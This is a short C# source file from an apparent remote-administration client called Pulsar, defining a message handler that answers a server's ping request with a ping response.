using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Diagnostics;

namespace Pulsar.Client.Messages
{
    /// <summary>
    /// Handles ping requests from the server.
    /// </summary>
    public class PingHandler : IMessageProcessor
    {
        /// <inheritdoc />
        public bool CanExecute(IMessage message) => message is PingRequest;

        /// <inheritdoc />
        public bool CanExecuteFrom(ISender sender) => true;

        /// <inheritdoc />
        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case PingRequest pingRequest:
                    Execute(sender, pingRequest);
                    break;
            }
        }

        private void Execute(ISender client, PingRequest message)
        {
            // respond fast ash
            client.Send(new PingResponse());
        }
    }
}
